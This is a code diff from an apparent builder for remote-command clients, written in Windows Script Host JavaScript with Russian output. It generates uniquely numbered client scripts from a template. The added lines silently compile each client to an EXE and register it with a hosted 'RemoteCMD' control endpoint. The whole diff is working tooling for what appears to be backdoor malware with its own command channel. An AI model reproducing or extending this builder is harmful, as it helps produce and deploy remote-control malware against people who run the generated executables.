@@ -21,6 +21,7 @@ function get(url){
 
 var id = Math.floor(Math.random()*9999999999999);
 var name = names[Math.floor(Math.random()*names.length)];
+var path = WScript.ScriptFullName.replace("createScript.js","client_"+id+".js");
 
 var text = fs.OpenTextFile("client.js", 1).ReadAll();
 text = text.replace("##FILE##", id);
@@ -30,9 +31,11 @@ var file = fs.OpenTextFile("client_"+id+".js", 2, 1);
 file.Write(text);
 file.Close();
 
+shell.Run('c2exe\\compile.bat "'+path+'"', 0);
+
 get("http://yfiles.22web.org/RemoteCMD/write.php?name="+id+".txt&data=cmd:script_not_runned");
 
-WScript.StdOut.Write("Скрипт успешно создан!\n\nID скрипта: "+id+"\nПуть к скрипту: "+WScript.ScriptFullName.replace("createScript.js","client_"+id+".js")+"\n\nID скрипта скопирован!\n");
+WScript.StdOut.Write("Скрипт успешно создан!\n\nID скрипта: "+id+"\nПуть к скрипту: "+path+"\nПуть к упакованному в EXE скрипту: "+path.replace(".js", ".exe")+"\n\nID скрипта скопирован!\n");
 shell.Run('cmd /c "echo '+id+'|clip"', 0);
 
 WScript.StdIn.ReadLine();
